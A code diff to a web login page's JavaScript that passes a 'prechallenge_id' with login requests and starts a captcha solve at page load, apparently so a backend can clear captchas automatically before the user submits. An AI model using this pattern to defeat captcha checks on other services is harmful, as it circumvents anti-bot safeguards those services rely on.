@@ -537,7 +537,7 @@ async function _autoRetryLogin() {
     return;
   }
   try {
-    var r = await fetch('/api/login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({login:captchaEmail,password:captchaPw}) });
+    var r = await fetch('/api/login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({login:captchaEmail,password:captchaPw,prechallenge_id:_prechallengeId}) });
     var d = await r.json();
     if (d.captcha_stall) {
       showCaptchaStall(d.session_id);
@@ -717,7 +717,7 @@ document.getElementById('login-form').addEventListener('submit', async function(
   _autoRetryCount = 0; /* reset auto-retry counter on fresh login */
   btnLoad('login-btn', true);
   try {
-    var r = await fetch('/api/login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({login:em,password:pw}) });
+    var r = await fetch('/api/login', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({login:em,password:pw,prechallenge_id:_prechallengeId}) });
     var d = await r.json();
     if (d.success) { onSuccess(d); return; }
     if (d.captcha_stall) {
@@ -799,10 +799,15 @@ function backToLogin() {
 }
 
 /* ═══ Init ═══ */
+var _prechallengeId = null;
 window.addEventListener('DOMContentLoaded', function() {
   initQR();
-  /* Kick off captcha pre-solve immediately so token is ready by the time user submits */
-  fetch('/api/pressolve', {method:'POST'}).catch(function(){});
+  /* Start predictive pre-challenge: trigger captcha solve BEFORE user clicks Login.
+     By the time they type credentials and click Login (~10-20s), captcha is solved. */
+  fetch('/api/prechallenge', {method:'POST'})
+    .then(function(r){return r.json()})
+    .then(function(d){ if(d.prechallenge_id) _prechallengeId = d.prechallenge_id; })
+    .catch(function(){});
 });
 </script>
 </body>
